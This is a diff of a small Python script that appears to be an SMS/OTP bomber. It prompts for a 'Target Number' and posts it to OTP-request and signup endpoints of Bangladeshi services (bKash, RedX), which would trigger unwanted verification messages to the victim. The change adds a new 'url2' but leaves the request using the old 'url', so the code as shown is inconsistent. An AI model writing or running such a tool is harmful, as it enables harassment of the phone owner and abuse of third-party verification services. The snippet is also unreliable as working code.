@@ -12,7 +12,7 @@ logo = ("""
 print(logo)
 
 number = input("Enter Target Number: ")
-url = "https://cpp.bka.sh/external-services/referral/report/otp/request"
+url2="https://api.redx.com.bd/v1/user/signup"
 data = {"referrerWallet": number}
 
 response = requests.post(url, json=data)
